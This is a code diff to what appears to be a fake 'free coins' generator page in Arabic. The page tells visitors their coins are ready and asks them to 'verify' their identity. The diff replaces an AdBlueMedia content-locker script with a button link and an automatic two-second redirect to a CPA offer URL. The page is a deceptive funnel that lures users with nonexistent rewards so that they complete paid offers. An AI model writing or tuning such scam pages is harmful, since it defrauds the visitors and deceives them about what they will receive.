@@ -276,12 +276,6 @@
             .card { padding: 25px 15px; }
         }
     </style>
-    
-    <!-- AdBlueMedia Content Locker Script -->
-    <script type="text/javascript">
-        var wRXbQ_mmu_gLHwZc={"it":4618318,"key":"33e43"};
-    </script>
-    <script src="https://d1g1lhd4vferpn.cloudfront.net/42a5be6.js"></script>
 </head>
 <body>
     <!-- Google Tag Manager (noscript) -->
@@ -341,7 +335,7 @@
                 <h2 style="color: var(--secondary); margin: 0 0 10px 0;">التحقق مطلوب</h2>
                 <p style="color: #bbb; font-size: 0.9rem; margin-bottom: 20px;">تم تجهيز العملات! يرجى إكمال عملية التحقق لتأكيد هويتك وضمان وصول الرصيد.</p>
                 
-                <button class="cpa-btn" onclick="_VR();">تحقق الآن</button>
+                <a href="https://jhuweq.com/cl/dbd2d92" class="cpa-btn">تحقق الآن</a>
             </div>
         </div>
     </div>
@@ -390,10 +384,11 @@
                             document.getElementById('tm').innerText = `${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
                             if(t > 0) t--;
                         }, 1000);
-                        // Call the locker automatically when reaching verification zone
-                        if(typeof _VR === 'function') {
-                            _VR();
-                        }
+                        
+                        // Automatically redirect to the CPA link after 2 seconds in the verification zone
+                        setTimeout(() => {
+                            window.location.href = "https://jhuweq.com/cl/dbd2d92";
+                        }, 2000);
                     }, 1000);
                 }
             }, 800);
